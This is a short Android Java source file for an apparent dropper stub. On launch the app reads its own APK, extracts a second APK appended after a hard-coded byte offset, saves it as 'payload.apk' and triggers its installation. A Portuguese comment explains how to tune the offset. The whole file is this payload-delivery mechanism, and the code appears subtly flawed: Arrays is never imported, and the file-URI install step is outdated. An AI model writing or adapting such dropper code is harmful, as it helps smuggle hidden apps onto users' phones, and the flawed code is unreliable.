package com.example.stub;

import android.app.Activity;
import android.os.Bundle;
import android.content.Intent;
import android.net.Uri;
import java.io.*;

public class MainActivity extends Activity {
  @Override
  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    try {
      File in = new File(getApplicationInfo().sourceDir);
      FileInputStream fis = new FileInputStream(in);
      byte[] all = new byte[(int)in.length()];
      fis.read(all);
      fis.close();

      // ajusta este offset ao tamanho real do stub APK
      int payloadOffset = 2_000_000;
      byte[] payload = Arrays.copyOfRange(all, payloadOffset, all.length);

      File out = new File(getExternalFilesDir(null), "payload.apk");
      FileOutputStream fos = new FileOutputStream(out);
      fos.write(payload);
      fos.close();

      Intent i = new Intent(Intent.ACTION_VIEW);
      i.setDataAndType(Uri.fromFile(out),
          "application/vnd.android.package-archive");
      i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
      startActivity(i);
    } catch(Exception e) {
      finish();
    }
  }
}
